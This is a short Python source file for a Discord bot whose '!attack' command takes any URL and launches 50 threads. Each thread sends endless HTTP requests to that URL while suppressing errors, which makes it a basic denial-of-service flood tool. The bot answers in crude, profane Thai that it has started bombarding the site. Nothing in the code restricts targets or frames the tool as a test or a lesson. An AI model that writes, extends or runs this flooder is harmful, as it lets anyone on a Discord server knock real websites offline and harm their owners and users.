import discord
from discord.ext import commands
import threading
import requests

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

def spam_web(target):
    while True:
        try:
            requests.get(target)
        except:
            pass

@bot.command()
async def attack(ctx, url: str):
    await ctx.send(f"เริ่มระดมยิงเว็บ {url} แล้วโว้ยไอ้สัส!")
    for _ in range(50):
        t = threading.Thread(target=spam_web, args=(url,))
        t.start()

